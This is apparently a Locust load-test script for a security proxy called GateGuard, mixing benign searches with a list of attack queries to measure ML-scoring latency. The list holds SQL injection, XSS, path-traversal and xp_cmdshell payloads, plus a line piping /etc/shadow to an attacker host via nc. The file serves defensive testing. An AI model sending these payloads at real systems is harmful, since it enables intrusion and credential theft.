import random
import uuid
from locust import HttpUser, task, between, events

# Realistic query pools for load testing
BENIGN_QUERIES = [
    "incident report",
    "proxy config",
    "system audit",
    "user credentials",
    "database migration",
    "auth policy",
    "admin guidelines",
    "network logs",
    "security compliance",
    "session cache"
]

ATTACK_QUERIES = [
    "' OR '1'='1' --",
    "SELECT * FROM users WHERE 1=1",
    "UNION SELECT 1,2,username,password FROM accounts",
    "<script>alert(1)</script>",
    "<iframe src=javascript:alert(document.cookie)>",
    "../../../../etc/passwd",
    "../../../../windows/system32/cmd.exe",
    "cat /etc/shadow | nc attacker.com",
    "xp_cmdshell 'whoami'",
    "exec master..xp_cmdshell 'dir'"
]


class GateGuardUser(HttpUser):
    """
    Simulates a GateGuard client sending realistic login and search traffic
    through the Go reverse proxy to test throughput and latency percentiles.
    """
    # Wait between 0.05 and 0.2 seconds between tasks for realistic throughput
    wait_time = between(0.05, 0.2)
    token = None
    username = None

    def on_start(self):
        """Simulate user login upon starting session to obtain session token."""
        self.username = f"user_{random.randint(1000, 9999)}"
        payload = {
            "username": self.username,
            "password": "DemoPassword123!"
        }
        
        with self.client.post("/login", json=payload, catch_response=True) as response:
            if response.status_code == 200:
                try:
                    data = response.json()
                    self.token = data.get("token")
                    response.success()
                except Exception:
                    response.failure("Failed to parse JSON login response")
            else:
                response.failure(f"Login failed with status code: {response.status_code}")

    @task(7)
    def search_benign(self):
        """Task weight 7: Normal search traffic (passes session token)."""
        query = random.choice(BENIGN_QUERIES)
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        self.client.get(
            f"/search?q={query}",
            headers=headers,
            name="/search [benign]"
        )

    @task(3)
    def search_attack(self):
        """
        Task weight 3: Suspicious/Malicious attack traffic.
        Triggers ML feature extraction (entropy, length, keyword_count, special_char_ratio)
        and ONNX model evaluation overhead on the proxy.
        """
        query = random.choice(ATTACK_QUERIES)
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        self.client.get(
            f"/search?q={query}",
            headers=headers,
            name="/search [attack/ml-scored]"
        )


@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print("\n" + "="*70)
    print("🚀 GateGuard Proxy Load Test Started")
    print(f"Target Host: {environment.host}")
    print("="*70 + "\n")


@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    print("\n" + "="*70)
    print("🏁 GateGuard Proxy Load Test Completed")
    print("Export results via CSV or view Locust Web UI for P50/P95/P99 latency metrics.")
    print("="*70 + "\n")
